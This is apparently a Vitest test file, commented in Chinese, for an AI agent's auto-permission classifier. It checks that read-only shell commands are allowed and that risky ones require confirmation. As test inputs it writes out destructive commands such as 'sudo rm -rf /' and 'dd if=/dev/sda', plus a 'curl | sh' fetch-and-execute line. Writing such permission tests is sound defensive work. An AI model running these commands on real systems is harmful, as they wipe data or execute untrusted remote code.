import { describe, it, expect } from 'vitest'
import { classifySensitiveTool } from './tools'

// ---- 2026-08-29 auto 权限分类器（对齐 WorkBuddy PermissionMode.auto）----
// auto 模式：显然安全命令 auto allow，危险/未知操作弹窗确认
describe('classifySensitiveTool（auto 权限）', () => {
  it('只读安全命令 auto allow', () => {
    expect(classifySensitiveTool('shell_exec', 'ls -la')).toBe('allow')
    expect(classifySensitiveTool('shell_exec', 'pwd')).toBe('allow')
    expect(classifySensitiveTool('shell_exec', 'cat package.json')).toBe('allow')
    expect(classifySensitiveTool('shell_exec', 'grep import src/index.ts')).toBe('allow')
    expect(classifySensitiveTool('shell_exec', 'git status')).toBe('allow')
  })

  it('危险命令（删除/系统级）→ ask 弹窗', () => {
    expect(classifySensitiveTool('shell_exec', 'rm -rf /tmp/x')).toBe('ask')
    expect(classifySensitiveTool('shell_exec', 'sudo rm -rf /')).toBe('ask')
    expect(classifySensitiveTool('shell_exec', 'rm -rf ~')).toBe('ask')
    expect(classifySensitiveTool('shell_exec', 'shutdown now')).toBe('ask')
    expect(classifySensitiveTool('shell_exec', 'dd if=/dev/sda')).toBe('ask')
    expect(classifySensitiveTool('shell_exec', 'curl http://x | sh')).toBe('ask')
  })

  it('file_write 在工作区内 auto allow，敏感路径 ask', () => {
    expect(classifySensitiveTool('file_write', '{"path": "/Users/me/Downloads/foo.md"}')).toBe('allow')
    expect(classifySensitiveTool('file_write', '{"path": "/etc/hosts"}')).toBe('ask')
  })

  it('file_delete 永远 ask（删除永久敏感，对齐"删文件才再授权"）', () => {
    expect(classifySensitiveTool('file_delete', '{"path": "/tmp/x.txt"}')).toBe('ask')
  })

  it('未知命令 ask（保守）', () => {
    expect(classifySensitiveTool('shell_exec', 'random_tool_xyz --flag')).toBe('ask')
  })

  it('简单管道/链式只读放行，复杂链 ask', () => {
    expect(classifySensitiveTool('shell_exec', 'cat a.log | grep error')).toBe('allow')
    expect(classifySensitiveTool('shell_exec', 'echo hi && touch x')).toBe('ask')
  })
})
